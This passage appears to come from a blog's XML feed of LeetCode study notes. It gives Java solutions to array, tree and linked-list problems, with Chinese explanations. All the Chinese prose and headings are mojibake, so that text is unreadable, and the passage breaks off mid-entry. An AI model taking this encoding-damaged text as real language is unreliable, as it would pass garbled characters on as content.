‘æ¯”è¾ƒçš„æ—¶å€™å°±æ˜¯å³å·¦ä¸­.<br>ç‰¹æ®Šæƒ…å†µä¼˜å…ˆè€ƒè™‘<br>å·¦ç©ºå³ç©º-&gt;true<br>å·¦ä¸ç©ºå³ç©º-&gt;false<br>å·¦ç©ºå³ä¸ç©º-&gt;false<br>é‚£æœ€åçš„æƒ…å†µå°±æ˜¯å·¦å³éƒ½ä¸ä¸ºç©ºäº†ï¼Œè¿™æ—¶å€™å°±éœ€è¦å•ç‹¬åˆ¤æ–­.<br>å•ä¾§ä¸å¯¹ç§°å°±å¯ä»¥è¿”å›false.<br>é‚£ä¹ˆè¿™ä¹ˆæ¯”è¾ƒå°±åªèƒ½æ˜¯ååºéå†äº†.<br>é€’å½’ç§’ï¼</p><h6 id="é€’å½’"><a href="#é€’å½’" class="headerlink" title="é€’å½’"></a>é€’å½’</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val, TreeNode left, TreeNode right) &#123;</span></span><br><span class="line"><span class="comment"> *         this.val = val;</span></span><br><span class="line"><span class="comment"> *         this.left = left;</span></span><br><span class="line"><span class="comment"> *         this.right = right;</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isSymmetric</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> cmp(root.left,root.right);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">cmp</span><span class="params">(TreeNode left,TreeNode right)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(left == <span class="literal">null</span> &amp;&amp; right == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(left == <span class="literal">null</span> &amp;&amp; right != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(left != <span class="literal">null</span> &amp;&amp; right == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(right.val != left.val)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">last</span> <span class="operator">=</span> cmp(left.left,right.right);</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">lastnext</span> <span class="operator">=</span> cmp(left.right,right.left);</span><br><span class="line">        <span class="keyword">return</span> last &amp;&amp; lastnext;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>æ³¨æ„</strong><br>ä¸è¦else ifåˆ¤æ–­ç»“æŸä¹‹åç›´æ¥else{return true;}<br>è¿™æ ·åšçš„è¯æ²¡æœ‰åˆ¤æ–­å…¶ä»–å‰©ä½™çš„å­èŠ‚ç‚¹ ï¼Œæ„å‘³ç€ä¸­å±‚èŠ‚ç‚¹çš„å€¼å¿ƒç›¸ç­‰ï¼Œä½†æ˜¯å¶å­èŠ‚ç‚¹çš„å€¼ä¸é€šï¼Œä½†ä»ç„¶åˆ¤æ–­è¿™ç§æƒ…å†µä¸ºtrueï¼Œè¿™æ ·æ˜¯ä¸å¯¹çš„.</p>]]></content>
      
      
      <categories>
          
          <category> Algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Algorithm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>yubã®Algorithm.0x2</title>
      <link href="/2024/11/08/yub%E3%81%AEAlgorithm.0x2/"/>
      <url>/2024/11/08/yub%E3%81%AEAlgorithm.0x2/</url>
      
        <content type="html"><![CDATA[<h4 id="ç§»é™¤å…ƒç´ "><a href="#ç§»é™¤å…ƒç´ " class="headerlink" title="ç§»é™¤å…ƒç´ "></a>ç§»é™¤å…ƒç´ </h4><p>linkï¼š<a href="https://leetcode.cn/problems/remove-element/solutions/1689028/by-carlsun-2-fdc4/">27. ç§»é™¤å…ƒç´  - åŠ›æ‰£ï¼ˆLeetCodeï¼‰</a></p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240925141403675.png" alt="image-20240925141403675"></p><h5 id="æ€è·¯åˆ†æ"><a href="#æ€è·¯åˆ†æ" class="headerlink" title="æ€è·¯åˆ†æ"></a>æ€è·¯åˆ†æ</h5><p>1.å¸¸è§„éå†æ•°ç»„ï¼Œæ¯”è¾ƒvauleå€¼æ˜¯å¦ç›¸ç­‰ï¼Œè‹¥ä¸ç›¸ç­‰å¾€å‰æ‹·è´è¦†ç›–å³å¯ï¼Œç›¸ç­‰è·³è¿‡ï¼Œæ›´æ–°ä¸‹æ ‡ï¼ˆå¯ä»¥ç†è§£ä¸ºæ•°ç»„é•¿åº¦å‡å°‘ï¼‰.ã€æ—¶é—´å¤æ‚åº¦O(n) ç©ºé—´å¤æ‚åº¦O(1)ã€‘<br>2.å¿«æ…¢æŒ‡é’ˆ.å¿«æŒ‡é’ˆéå†è¿›è¡Œç­›é€‰ï¼Œæ…¢æŒ‡é’ˆå¯¹åº”å¸¸è§å­˜å‚¨çš„æ•°ç»„.æ‰¾åˆ°ç›®æ ‡vauleåfastå’ŒslowæŒ‡é’ˆæ‹‰å¼€è·ç¦»å¼€å§‹éå†ç»´æŠ¤æ›´æ–°.ã€æ—¶é—´å¤æ‚åº¦O(n) ç©ºé—´å¤æ‚åº¦O(1)ã€‘</p><h6 id="æ‹·è´è¦†ç›–"><a href="#æ‹·è´è¦†ç›–" class="headerlink" title="æ‹·è´è¦†ç›–"></a>æ‹·è´è¦†ç›–</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">removeElement</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> val)</span> &#123;</span><br><span class="line">          <span class="type">int</span> <span class="variable">k</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">          <span class="keyword">for</span>(<span class="type">int</span> num:nums)&#123;</span><br><span class="line">            <span class="keyword">if</span>(num != val)&#123;</span><br><span class="line">                nums[k] = num;</span><br><span class="line">                k++; </span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">return</span> k;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="åŒæŒ‡é’ˆ"><a href="#åŒæŒ‡é’ˆ" class="headerlink" title="åŒæŒ‡é’ˆ"></a>åŒæŒ‡é’ˆ</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">removeElement</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> val)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">fast</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">slow</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(slow = <span class="number">0</span>; fast &lt; nums.length; fast++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[fast] != val)&#123;</span><br><span class="line">                nums[slow] = nums[fast];</span><br><span class="line">                slow++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> slow;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h5><p>æ³¨æ„å¤šç§æ€è·¯è¾¨æ.</p>]]></content>
      
      
      <categories>
          
          <category> Algorithm </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>yubã®Algorithm.0x3</title>
      <link href="/2024/11/08/yub%E3%81%AEAlgorithm.0x3/"/>
      <url>/2024/11/08/yub%E3%81%AEAlgorithm.0x3/</url>
      
        <content type="html"><![CDATA[<h4 id="æœ‰åºæ•°ç»„çš„å¹³æ–¹"><a href="#æœ‰åºæ•°ç»„çš„å¹³æ–¹" class="headerlink" title="æœ‰åºæ•°ç»„çš„å¹³æ–¹"></a>æœ‰åºæ•°ç»„çš„å¹³æ–¹</h4><p>linkï¼š<a href="https://leetcode.cn/problems/squares-of-a-sorted-array/description/">977. æœ‰åºæ•°ç»„çš„å¹³æ–¹ - åŠ›æ‰£ï¼ˆLeetCodeï¼‰</a><br><strong>éé€’å‡é¡ºåº</strong><br>ä¸€ä¸ªæ•°åˆ—ä¸­çš„å…ƒç´ ä»å·¦åˆ°å³ä¾æ¬¡ä¸å‡ï¼Œæˆ–è€…è¯´ä¸é™åºæ’åˆ—.<br>æ¯”å¦‚ï¼š1233445ï¼Œ12345.</p><h5 id="æ€è·¯åˆ†æ"><a href="#æ€è·¯åˆ†æ" class="headerlink" title="æ€è·¯åˆ†æ"></a>æ€è·¯åˆ†æ</h5><p>å¦‚æœçœ‹åˆ°æ•°ç»„èƒ½æ¡ä»¶åå°„åˆ°åŒæŒ‡é’ˆé‚£å·²ç»æ˜¯winäº†.<br>æ ¹æ®é¢˜æ„å¹³æ–¹ä¹‹åçš„æ•°ä¸€å®šåœ¨æ•°ç»„çš„ä¸¤ç«¯.ä¸¤ä¸ªæŒ‡é’ˆä¸€é¦–ä¸€å°¾ï¼Œä»åå¾€å‰æ›´æ–°æ•°ç»„.<br><img src="D:\Users\lenovo\Desktop\æ— æ ‡é¢˜-2024-10-02-1521.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] sortedSquares(<span class="type">int</span>[] nums) &#123;</span><br><span class="line">      <span class="comment">//éé€’å‡æ•°ç»„å¯å¾—æœ€å¤§å€¼å¹³æ–¹åä¼šå‡ºç°åœ¨æ•°ç»„ä¸¤å¤´</span></span><br><span class="line">      <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">      <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> nums.length - <span class="number">1</span>;</span><br><span class="line">      <span class="type">int</span>[] result = <span class="keyword">new</span> <span class="title class_">int</span>[nums.length];</span><br><span class="line">      <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> result.length - <span class="number">1</span> ;</span><br><span class="line">      <span class="keyword">while</span>(left &lt;= right) &#123;</span><br><span class="line">        <span class="keyword">if</span>(nums[left]*nums[left] &gt; nums[right]*nums[right]) &#123;</span><br><span class="line">            result[index--] = nums[left] * nums[left++];</span><br><span class="line">           <span class="comment">// left++;</span></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">             result[index--] = nums[right] * nums[right--];</span><br><span class="line">            <span class="comment">//right--;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="é•¿åº¦æœ€å°çš„å­æ•°ç»„"><a href="#é•¿åº¦æœ€å°çš„å­æ•°ç»„" class="headerlink" title="é•¿åº¦æœ€å°çš„å­æ•°ç»„"></a>é•¿åº¦æœ€å°çš„å­æ•°ç»„</h4><p>linkï¼š<a href="https://leetcode.cn/problems/minimum-size-subarray-sum/description/">209. é•¿åº¦æœ€å°çš„å­æ•°ç»„ - åŠ›æ‰£ï¼ˆLeetCodeï¼‰</a></p><p><strong>åŒæŒ‡é’ˆå˜å½¢â€”â€”æ»‘åŠ¨çª—å£</strong><br>å…¶å®ä¹Ÿå¯ä»¥ç†è§£æˆç»™å…¥é˜Ÿçš„é˜Ÿåˆ—ä¸€ä¸ªç»™å®šçš„å¤§å°å˜æˆçª—å£ï¼Œå…ˆå…¥é˜Ÿå…ƒç´ ï¼Œç„¶åå’Œtargetè¿›è¡Œæ¯”è¾ƒï¼Œå¤§äºç­‰äºtargetå°±å‡ºé˜Ÿå…ˆè¿›çš„å…ƒç´ ï¼Œå†è¿›æ–°å…ƒç´ å¹¶ä¸”æ ‡è®°å¥½åŸæ¥å¤§äºç­‰äºtargetçš„æ•°ç»„é•¿åº¦.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">minSubArrayLen</span><span class="params">(<span class="type">int</span> target, <span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">begin</span> <span class="operator">=</span> <span class="number">0</span>;<span class="comment">//èµ·å§‹ä½ç½®</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>;<span class="comment">//æ»‘åŠ¨çª—å£å€¼æ€»å’Œ</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> Integer.MAX_VALUE;<span class="comment">//å®šä¹‰æœ€å¤§å€¼ éå†ä¸å‡ºé”™</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">end</span> <span class="operator">=</span> <span class="number">0</span>; end &lt; nums.length;end++) &#123;</span><br><span class="line">            sum += nums[end];</span><br><span class="line">            <span class="keyword">while</span>(sum &gt;= target) &#123;</span><br><span class="line">                result = Math.min(result, end - begin + <span class="number">1</span>);<span class="comment">//æœ€å°é•¿åº¦</span></span><br><span class="line">                sum -= nums[begin++];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result == Integer.MAX_VALUE ? <span class="number">0</span> : result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>å…³é”®ç‚¹ï¼šå¦‚ä½•ç§»åŠ¨èµ·å§‹ä½ç½®</strong><br>å¦‚æœå¾ªç¯ä¸­çš„æ ‡è®°ä½åœ¨èµ·å§‹ä½ç½®ï¼Œèµ·å§‹ä½ç½®å’Œç»ˆæ­¢ä½ç½®éƒ½éœ€è¦ç§»åŠ¨ä¸€éå’Œæš´åŠ›è§£æ³•æ— å·®åˆ«ï¼Œæ‰€ä»¥æˆ‘ä»¬çš„æ ‡è®°ä½ä¸€å®šæ˜¯ç»ˆæ­¢ä½.</p><h4 id="èºæ—‹çŸ©é˜µ-II"><a href="#èºæ—‹çŸ©é˜µ-II" class="headerlink" title="èºæ—‹çŸ©é˜µ II"></a>èºæ—‹çŸ©é˜µ II</h4><p>linkï¼š<a href="https://leetcode.cn/problems/spiral-matrix-ii/description/">59. èºæ—‹çŸ©é˜µ II - åŠ›æ‰£ï¼ˆLeetCodeï¼‰</a><br>å¥‡æ€ªçš„ä»£ç æŒæ§åŠ›â€¦ ä¸»è¦é—®é¢˜åœ¨<strong>è¾¹ç•Œå¤„ç†</strong></p><h6 id="é¡ºåºè§£å†³"><a href="#é¡ºåºè§£å†³" class="headerlink" title="é¡ºåºè§£å†³"></a>é¡ºåºè§£å†³</h6><p>æŒ‰ç…§æœ¬æ¥çš„é€»è¾‘</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[][] generateMatrix(<span class="type">int</span> n) &#123;</span><br><span class="line">     <span class="type">int</span> <span class="variable">l</span> <span class="operator">=</span> <span class="number">0</span>,r = n - <span class="number">1</span>,t = <span class="number">0</span>,b = n-<span class="number">1</span>;</span><br><span class="line">     <span class="type">int</span>[][] result = <span class="keyword">new</span> <span class="title class_">int</span>[n][n];</span><br><span class="line">     <span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">     <span class="type">int</span> <span class="variable">tar</span> <span class="operator">=</span> n * n;</span><br><span class="line">     <span class="keyword">while</span>(num &lt;= tar) &#123;</span><br><span class="line">     <span class="comment">//ç¬¬ä¸€è¡Œå¼€å§‹</span></span><br><span class="line">     <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> l;i &lt;= r;i++)&#123;</span><br><span class="line">        result[t][i] = num++;</span><br><span class="line">     &#125;</span><br><span class="line">     t++;</span><br><span class="line">     <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> t; i &lt;= b; i++)&#123;</span><br><span class="line">        result[i][r] = num++;</span><br><span class="line">     &#125;</span><br><span class="line">     r--;</span><br><span class="line">     <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> r; i &gt;=l; i--)&#123;</span><br><span class="line">        result[b][i] = num++;</span><br><span class="line">     &#125;</span><br><span class="line">     b--;</span><br><span class="line">     <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> b;i &gt;= t;i--) &#123;</span><br><span class="line">        result[i][l] = num++;</span><br><span class="line">     &#125;</span><br><span class="line">     l++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h6 id="æ”¹ç¼–ç‰ˆæœ¬"><a href="#æ”¹ç¼–ç‰ˆæœ¬" class="headerlink" title="æ”¹ç¼–ç‰ˆæœ¬"></a>æ”¹ç¼–ç‰ˆæœ¬</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[][] generateMatrix(<span class="type">int</span> n) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">loop</span> <span class="operator">=</span> <span class="number">0</span>;  <span class="comment">// æ§åˆ¶å¾ªç¯æ¬¡æ•°</span></span><br><span class="line">        <span class="type">int</span>[][] res = <span class="keyword">new</span> <span class="title class_">int</span>[n][n];</span><br><span class="line">        <span class="type">int</span> <span class="variable">start</span> <span class="operator">=</span> <span class="number">0</span>;  <span class="comment">// æ¯æ¬¡å¾ªç¯çš„å¼€å§‹ç‚¹(start, start)</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">1</span>;  <span class="comment">// å®šä¹‰å¡«å……æ•°å­—</span></span><br><span class="line">        <span class="type">int</span> i, j;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (loop++ &lt; n / <span class="number">2</span>) &#123; <span class="comment">// åˆ¤æ–­è¾¹ç•Œåï¼Œloopä»1å¼€å§‹</span></span><br><span class="line">            <span class="comment">// æ¨¡æ‹Ÿä¸Šä¾§ä»å·¦åˆ°å³</span></span><br><span class="line">            <span class="keyword">for</span> (j = start; j &lt; n - loop; j++) &#123;</span><br><span class="line">                res[start][j] = count++;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// æ¨¡æ‹Ÿå³ä¾§ä»ä¸Šåˆ°ä¸‹</span></span><br><span class="line">            <span class="keyword">for</span> (i = start; i &lt; n - loop; i++) &#123;</span><br><span class="line">                res[i][j] = count++;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// æ¨¡æ‹Ÿä¸‹ä¾§ä»å³åˆ°å·¦</span></span><br><span class="line">            <span class="keyword">for</span> (; j &gt;= loop; j--) &#123;</span><br><span class="line">                res[i][j] = count++;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// æ¨¡æ‹Ÿå·¦ä¾§ä»ä¸‹åˆ°ä¸Š</span></span><br><span class="line">            <span class="keyword">for</span> (; i &gt;= loop; i--) &#123;</span><br><span class="line">                res[i][j] = count++;</span><br><span class="line">            &#125;</span><br><span class="line">            start++;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (n % <span class="number">2</span> == <span class="number">1</span>) &#123;</span><br><span class="line">            res[start][start] = count;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h4><p>1.é‡åˆ°æœ‰åºæ•°ç»„è€ƒè™‘äºŒåˆ†æ³•.<br>2.åŒæŒ‡é’ˆï¼ˆæ‰¾å‡†å¾ªç¯ä¸å˜é‡ä¸­çš„ä¸å˜é‡ï¼‰.<br>3.æ±‚è¿ç»­å­æ•°ç»„çš„æ€»å’Œå¯ç”¨æ»‘åŠ¨çª—å£è§£å†³.</p>]]></content>
      
      
      <categories>
          
          <category> Algorithm </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>yubã®Algorithm.0x4</title>
      <link href="/2024/11/08/yub%E3%81%AEAlgorithm.0x4/"/>
      <url>/2024/11/08/yub%E3%81%AEAlgorithm.0x4/</url>
      
        <content type="html"><![CDATA[<h4 id="ç§»é™¤åˆ—è¡¨å…ƒç´ "><a href="#ç§»é™¤åˆ—è¡¨å…ƒç´ " class="headerlink" title="ç§»é™¤åˆ—è¡¨å…ƒç´ "></a>ç§»é™¤åˆ—è¡¨å…ƒç´ </h4><p>linkï¼š<a href="https://leetcode.cn/problems/remove-linked-list-elements/description/">203. ç§»é™¤é“¾è¡¨å…ƒç´  - åŠ›æ‰£ï¼ˆLeetCodeï¼‰</a></p><p>é¦–å…ˆå•å‘é“¾è¡¨æ˜¯æœ‰ä¸€ä¸ªæ•°æ®åŸŸå’ŒæŒ‡é’ˆåŸŸä¸”åœ¨å†…å­˜ä¸­ä¸è¿ç»­.<br><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20241002232434525.png" alt="image-20241002232434525"><br>é“¾è¡¨çš„æŸ¥æ‰¾éœ€è¦ä»å¤´å¾€åä¸€ä¸ªä¸ªæŸ¥æ‰¾ã€æ—¶é—´å¤æ‚åº¦ä¸ºO(n)ã€‘ï¼Œä½†æ˜¯æ•°ç»„æŸ¥æ‰¾åªéœ€è¦è®¿é—®å¯¹åº”å…ƒç´ ä¸‹æ ‡å³å¯ã€æ—¶é—´å¤æ‚åº¦ä¸ºO(1)ã€‘.<br><strong>æŸ¥æ‰¾é¢‘ç¹</strong>ï¼šæ•°ç»„æ˜¯æ›´å¥½çš„é€‰æ‹©ï¼Œå› ä¸ºé€šè¿‡ç´¢å¼•è®¿é—®çš„æ—¶é—´å¤æ‚åº¦æ˜¯ O(1)ï¼Œé“¾è¡¨åˆ™éœ€è¦éå†.</p><p><strong>æ’å…¥&#x2F;åˆ é™¤é¢‘ç¹</strong>ï¼šé“¾è¡¨æ›´é€‚åˆï¼Œå› ä¸ºå®ƒå¯ä»¥é«˜æ•ˆåœ°æ’å…¥å’Œåˆ é™¤å…ƒç´ ï¼Œæ—¶é—´å¤æ‚åº¦ä¸º O(1)ï¼ˆå‡è®¾å·²æ‰¾åˆ°æ’å…¥æˆ–åˆ é™¤ä½ç½®ï¼‰ã€‚ç›¸åï¼Œæ•°ç»„åœ¨æ’å…¥å’Œåˆ é™¤æ—¶éœ€è¦ç§»åŠ¨å¤§é‡å…ƒç´ ï¼Œæ—¶é—´å¤æ‚åº¦ä¸º O(n).</p><h5 id="æ€è·¯åˆ†æ"><a href="#æ€è·¯åˆ†æ" class="headerlink" title="æ€è·¯åˆ†æ"></a>æ€è·¯åˆ†æ</h5><p>çœ‹åˆ°é¢˜ç›®æœ€ç¬¬ä¸€ååº”å°±æ˜¯å¸¸è§„è§£æ³•ï¼Œéå†é“¾è¡¨æ‰¾åˆ°targetç›´æ¥è¿›è¡Œåˆ é™¤æ“ä½œ.ã€ç›®æ ‡æ˜¯å¤´èŠ‚ç‚¹å’Œä¸æ˜¯å¤´èŠ‚ç‚¹ä¸¤ç§æƒ…å†µã€‘ï¼ˆå…¶å®è¿˜æ˜¯æƒ³æœ‰æ›´ä¼˜é›…çš„è§£æ³• ä¸ç”¨å•ç‹¬å¤„ç†ç§»é™¤å¤´èŠ‚ç‚¹çš„æƒ…å†µï¼‰</p><h6 id="ç›´æ¥åˆ é™¤"><a href="#ç›´æ¥åˆ é™¤" class="headerlink" title="ç›´æ¥åˆ é™¤"></a>ç›´æ¥åˆ é™¤</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span 